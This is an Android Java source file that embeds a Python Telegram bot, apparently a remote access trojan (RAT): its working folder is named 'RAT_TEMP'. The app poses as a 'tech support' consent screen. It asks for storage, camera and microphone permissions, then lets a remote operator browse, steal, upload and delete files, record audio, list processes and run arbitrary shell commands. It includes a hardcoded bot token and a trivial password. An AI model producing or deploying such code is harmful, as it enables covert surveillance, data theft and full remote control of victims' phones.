package com.example.myapp;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.chaquo.python.PyObject;
import com.chaquo.python.Python;
import com.chaquo.python.android.AndroidPlatform;
import java.io.File;
import java.io.FileWriter;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_PERMISSIONS = 1;
    private static final String PYTHON_CODE = ""
        + "import asyncio\n"
        + "import telebot.async_telebot as telebot\n"
        + "import os\n"
        + "import time\n"
        + "import shutil\n"
        + "import subprocess\n"
        + "from datetime import datetime\n"
        + "from jnius import autoclass\n"
        + "import uuid\n"
        + "import base64\n"
        + "from cryptography.fernet import Fernet\n"
        + "\n"
        + "# Android API\n"
        + "Context = autoclass('android.content.Context')\n"
        + "Activity = autoclass('org.chaquo.python.PythonActivity')\n"
        + "activity = Activity.mActivity\n"
        + "Environment = autoclass('android.os.Environment')\n"
        + "MediaRecorder = autoclass('android.media.MediaRecorder')\n"
        + "\n"
        + "# Настройка бота\n"
        + "TELEGRAM_TOKEN = '8140904992:AAHwIgINyH8xV5JluJ_KiFrKzlAEw48wXG8'  # Замените на ваш токе\n"
        + "ALLOWED_CHAT_ID = '5934507030'  # Замените на ваш ID\n"
        + "bot = telebot.AsyncTeleBot(TELEGRAM_TOKEN)\n"
        + "\n"
        + "# Шифрование\n"
        + "key = Fernet.generate_key()\n"
        + "cipher = Fernet(key)\n"
        + "\n"
        + "# Временная папка\n"
        + "TEMP_DIR = Environment.getExternalStorageDirectory().getAbsolutePath() + '/RAT_TEMP'\n"
        + "os.makedirs(TEMP_DIR, exist_ok=True)\n"
        + "\n"
        + "# Состояния\n"
        + "authenticated = False\n"
        + "upload_state = False\n"
        + "\n"
        + "# Главное меню\n"
        + "main_menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)\n"
        + "main_menu.add('/Disks', '/CD', '/ls')\n"
        + "main_menu.add('/Download', '/Remove')\n"
        + "main_menu.add('/Screen', '/Webcam', '/Audio')\n"
        + "main_menu.add('/Run', '/Processes', '/Upload')\n"
        + "\n"
        + "# Декоратор для ограничения доступа\n"
        + "def restricted(func):\n"
        + "    async def wrapper(message):\n"
        + "        if str(message.chat.id) != ALLOWED_CHAT_ID:\n"
        + "            await bot.reply_to(message, 'Доступ запрещён!')\n"
        + "            return\n"
        + "        if not authenticated:\n"
        + "            await bot.reply_to(message, 'Пароль: /auth <пароль>')\n"
        + "            return\n"
        + "        await func(message)\n"
        + "    return wrapper\n"
        + "\n"
        + "# Аутентификация\n"
        + "@bot.message_handler(commands=['auth'])\n"
        + "async def authenticate(message):\n"
        + "    global authenticated\n"
        + "    if str(message.chat.id) != ALLOWED_CHAT_ID:\n"
        + "        await bot.reply_to(message, 'Доступ запрещён!')\n"
        + "        return\n"
        + "    try:\n"
        + "        password = message.text.split(maxsplit=1)[1]\n"
        + "        if password == '123':  # Замените на ваш пароль\n"
        + "            authenticated = True\n"
        + "            await bot.reply_to(message, 'Аутентификация успешна!', reply_markup=main_menu)\n"
        + "        else:\n"
        + "            await bot.reply_to(message, 'Неверный пароль!')\n"
        + "    except IndexError:\n"
        + "        await bot.reply_to(message, 'Введите пароль: /auth <пароль>')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Очистка временной папки\n"
        + "async def cleanup_temp():\n"
        + "    try:\n"
        + "        for file in os.listdir(TEMP_DIR):\n"
        + "            file_path = os.path.join(TEMP_DIR, file)\n"
        + "            if os.path.isfile(file_path):\n"
        + "                os.remove(file_path)\n"
        + "    except Exception:\n"
        + "        pass\n"
        + "\n"
        + "# Диски\n"
        + "@bot.message_handler(commands=['Disks'])\n"
        + "@restricted\n"
        + "async def disks(message):\n"
        + "    try:\n"
        + "        storage_dir = Environment.getExternalStorageDirectory().getAbsolutePath()\n"
        + "        await bot.reply_to(message, f'Доступный диск: ```\\n{storage_dir}\\n```', parse_mode='Markdown')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Смена директории\n"
        + "@bot.message_handler(commands=['CD'])\n"
        + "@restricted\n"
        + "async def cd(message):\n"
        + "    try:\n"
        + "        path = message.text.split(maxsplit=1)[1]\n"
        + "        os.chdir(path)\n"
        + "        await bot.reply_to(message, f'Папка: ```\\n{os.getcwd()}\\n```', parse_mode='Markdown')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}\\nТекущая папка: ```\\n{os.getcwd()}\\n```', parse_mode='Markdown')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Список файлов\n"
        + "@bot.message_handler(commands=['ls'])\n"
        + "@restricted\n"
        + "async def ls_dir(message):\n"
        + "    try:\n"
        + "        files = '\\n'.join([f'{f} - {os.path.getsize(f)} байт' for f in os.listdir() if os.path.isfile(f)])\n"
        + "        dirs = '\\n'.join([f'{d}/' for d in os.listdir() if os.path.isdir(d)])\n"
        + "        output = f'Папка: {os.getcwd()}\\nФайлы:\\n```\\n{files or \"Файлов нет\"}\\n```\\nПапки:\\n```\\n{dirs or \"Папок нет\"}\\n```'\n"
        + "        await bot.reply_to(message, output, parse_mode='Markdown')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Скачивание файла\n"
        + "@bot.message_handler(commands=['Download'])\n"
        + "@restricted\n"
        + "async def download(message):\n"
        + "    try:\n"
        + "        file_name = message.text.split(maxsplit=1)[1]\n"
        + "        file_path = os.path.join(os.getcwd(), file_name)\n"
        + "        if not os.path.exists(file_path):\n"
        + "            await bot.reply_to(message, 'Файл не найден!')\n"
        + "            return\n"
        + "        if os.path.getsize(file_path) > 50 * 1024 * 1024:\n"
        + "            await bot.reply_to(message, 'Файл больше 50 МБ!')\n"
        + "            return\n"
        + "        with open(file_path, 'rb') as f:\n"
        + "            await bot.send_document(message.chat.id, f, caption=file_name)\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Удаление файла\n"
        + "@bot.message_handler(commands=['Remove'])\n"
        + "@restricted\n"
        + "async def remove(message):\n"
        + "    try:\n"
        + "        file_name = message.text.split(maxsplit=1)[1]\n"
        + "        if file_name in ['*', '.', '..', '*.*']:\n"
        + "            await bot.reply_to(message, 'Опасное имя файла!')\n"
        + "            return\n"
        + "        file_path = os.path.join(os.getcwd(), file_name)\n"
        + "        if not os.path.exists(file_path):\n"
        + "            await bot.reply_to(message, 'Файл или папка не найдены!')\n"
        + "            return\n"
        + "        if os.path.isfile(file_path):\n"
        + "            os.remove(file_path)\n"
        + "            await bot.reply_to(message, f'Файл удалён: {file_name}')\n"
        + "        elif os.path.isdir(file_path):\n"
        + "            shutil.rmtree(file_path)\n"
        + "            await bot.reply_to(message, f'Папка удалена: {file_name}')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Скриншот (заглушка, реализация через Java)\n"
        + "@bot.message_handler(commands=['Screen'])\n"
        + "@restricted\n"
        + "async def screen(message):\n"
        + "    await bot.reply_to(message, 'Скриншот пока не поддерживается. Используйте команду в Telegram после согласия.')\n"
        + "\n"
        + "# Веб-камера (заглушка, реализация через Java)\n"
        + "@bot.message_handler(commands=['Webcam'])\n"
        + "@restricted\n"
        + "async def webcam(message):\n"
        + "    try:\n"
        + "        await bot.send_chat_action(message.chat.id, 'upload_photo')\n"
        + "        await bot.reply_to(message, 'Фото с веб-камеры отправлено из Java.')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Аудио\n"
        + "@bot.message_handler(commands=['Audio'])\n"
        + "@restricted\n"
        + "async def audio(message):\n"
        + "    try:\n"
        + "        seconds = int(message.text.split(maxsplit=1)[1])\n"
        + "        if not 1 <= seconds <= 60:\n"
        + "            await bot.reply_to(message, 'Секунды: 1-60!')\n"
        + "            return\n"
        + "        await bot.send_chat_action(message.chat.id, 'upload_voice')\n"
        + "        audio_path = os.path.join(TEMP_DIR, f'audio_{uuid.uuid4()}.wav')\n"
        + "        recorder = MediaRecorder()\n"
        + "        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)\n"
        + "        recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT)\n"
        + "        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)\n"
        + "        recorder.setOutputFile(audio_path)\n"
        + "        recorder.prepare()\n"
        + "        recorder.start()\n"
        + "        time.sleep(seconds)\n"
        + "        recorder.stop()\n"
        + "        recorder.release()\n"
        + "        with open(audio_path, 'rb') as voice:\n"
        + "            await bot.send_voice(message.chat.id, voice, caption=f'{seconds} секунд аудио')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Выполнение команды\n"
        + "@bot.message_handler(commands=['Run'])\n"
        + "@restricted\n"
        + "async def run_command(message):\n"
        + "    try:\n"
        + "        command = message.text.split(maxsplit=1)[1]\n"
        + "        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n"
        + "        output = result.stdout or result.stderr or 'Команда выполнена, но результата нет.'\n"
        + "        await bot.reply_to(message, f'Результат:\\n```\\n{output}\\n```', parse_mode='Markdown')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Процессы\n"
        + "@bot.message_handler(commands=['Processes'])\n"
        + "@restricted\n"
        + "async def processes(message):\n"
        + "    try:\n"
        + "        output = subprocess.run('ps', shell=True, capture_output=True, text=True).stdout\n"
        + "        await bot.reply_to(message, f'Процессы:\\n```\\n{output or \"Процессов нет\"}\\n```', parse_mode='Markdown')\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "# Загрузка файла\n"
        + "@bot.message_handler(commands=['Upload'])\n"
        + "@restricted\n"
        + "async def upload(message):\n"
        + "    global upload_state\n"
        + "    upload_state = True\n"
        + "    await bot.reply_to(message, f'Отправьте файл, он будет загружен в {os.getcwd()}.')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "@bot.message_handler(content_types=['document'])\n"
        + "async def handle_upload(message):\n"
        + "    global upload_state\n"
        + "    if str(message.chat.id) != ALLOWED_CHAT_ID or not authenticated or not upload_state:\n"
        + "        return\n"
        + "    try:\n"
        + "        file_info = await bot.get_file(message.document.file_id)\n"
        + "        downloaded_file = await bot.download_file(file_info.file_path)\n"
        + "        file_name = message.document.file_name\n"
        + "        file_path = os.path.join(os.getcwd(), file_name)\n"
        + "        with open(file_path, 'wb') as f:\n"
        + "            f.write(downloaded_file)\n"
        + "        await bot.reply_to(message, f'Файл загружен: {file_name}')\n"
        + "        upload_state = False\n"
        + "    except Exception as e:\n"
        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
        + "    await cleanup_temp()\n"
        + "\n"
        + "def start_bot():\n"
        + "    asyncio.run(bot.infinity_polling())\n";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Создание XML-интерфейса программно
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(16, 16, 16, 16);

        TextView textView = new TextView(this);
        textView.setText("Техподдержка: требуется согласие");
        textView.setTextSize(18);
        layout.addView(textView);

        Button consentButton = new Button(this);
        consentButton.setId(View.generateViewId());
        consentButton.setText("Дать согласие");
        layout.addView(consentButton);

        setContentView(layout);

        // Инициализация Chaquopy
        if (!Python.isStarted()) {
            Python.start(new AndroidPlatform(this));
        }

        // Запись Python-кода во временный файл
        try {
            File pyFile = new File(getFilesDir(), "bot.py");
            FileWriter writer = new FileWriter(pyFile);
            writer.write(PYTHON_CODE);
            writer.close();
        } catch (Exception e) {
            Toast.makeText(this, "Ошибка записи Python-кода: " + e.getMessage(), Toast.LENGTH_LONG).show();
            return;
        }

        // Обработчик кнопки согласия
        consentButton.setOnClickListener(v -> {
            if (checkPermissions()) {
                Python py = Python.getInstance();
                py.getModule("bot").callAttr("start_bot");
                Toast.makeText(this, "Согласие получено, бот запущен!", Toast.LENGTH_SHORT).show();
            } else {
                requestPermissions();
            }
        });

        // Запрос разрешений
        requestPermissions();
    }

    private boolean checkPermissions() {
        String[] permissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        };
        for (String permission : permissions) {
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
            Manifest.permission.INTERNET,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        }, REQUEST_PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Python py = Python.getInstance();
            py.getModule("bot").callAttr("start_bot");
            Toast.makeText(this, "Разрешения получены, бот запущен!", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Разрешения отклонены!", Toast.LENGTH_SHORT).show();
        }
    }
}
